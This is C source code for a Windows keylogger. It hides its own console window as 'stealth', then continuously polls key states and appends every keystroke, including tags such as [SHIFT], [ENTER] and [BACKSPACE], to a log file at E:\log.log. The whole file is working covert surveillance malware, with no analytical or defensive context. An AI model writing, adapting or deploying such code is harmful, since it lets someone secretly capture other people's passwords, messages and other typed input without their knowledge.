#include<windows.h>
#include<stdlib.h>
#include<stdio.h>
main()
{
	int ch,j;
	FILE *fp;	
	HWND stealth; /*creating stealth (window is not visible)*/
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
	while(1)
	{
		Sleep(10);
		for(ch=0;ch<=288;ch++)
		{
			if(GetAsyncKeyState(ch)==-32767)
			{
				fp=fopen("E:\\log.log","a+");
				if(fp==NULL)
				{
					MessageBox(0,"File not opened","title",0);
					exit(1);
				}

				if((ch>=39)&&(ch<=64))
				{
					fputc(ch,fp);
					fclose(fp);
					break;
                }       
                else if((ch>64)&&(ch<91))
                {
					ch+=32;
                    fputc(ch,fp);
					fclose(fp);
                    break;
                }
				else
				{
					switch(ch)
					{
						case VK_SPACE:
                        fputc(' ',fp);
                        fclose(fp);
                        break;   
                        case VK_SHIFT:
                        fputs("[SHIFT]",fp);
                        fclose(fp);
                        break;                                           
                        case VK_RETURN:
                        fputs("\n[ENTER]",fp);
                        fclose(fp);
                        break;
                        case VK_BACK:
                        fputs("[BACKSPACE]",fp);
                        fclose(fp);
                        break;
                        case VK_TAB:
                        fputs("[TAB]",fp);
                        fclose(fp);
                        break;
                        case VK_CONTROL:
                        fputs("[CTRL]",fp);
                        fclose(fp);
                        break;   
                        case VK_DELETE:
                        fputs("[DEL]",fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD0:
                        fputc('0',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD1:
                        fputc('1',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD2:
                        fputc('2',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD3:
                        fputc('3',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD4:
                        fputc('4',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD5:
                        fputc('5',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD6:
                        fputc('6',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD7:
                        fputc('7',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD8:
                        fputc('8',fp);
                        fclose(fp);
                        break;
                        case VK_NUMPAD9:
                        fputc('9',fp);
                        fclose(fp);
                        break;
                        case VK_CAPITAL:
                        fputs("[CAPS LOCK]",fp);
                        fclose(fp);
                        break;
                        default:
						fputc(ch,fp);
                        fclose(fp);
                        break;
					}
				}
			}
		}
				
	}
	return 1;
}